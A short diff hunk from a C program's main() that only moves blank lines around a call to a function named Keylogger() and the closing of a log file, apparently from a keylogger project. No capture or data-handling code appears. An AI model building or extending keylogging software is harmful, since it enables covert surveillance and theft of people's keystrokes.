@@ -18,12 +18,12 @@ int main(void)
         return 1;
     }
     
+
     if (Keylogger() == false)
     {
         fclose(LogFile);
         return 1;
     }
-
 
     fclose(LogFile);
     
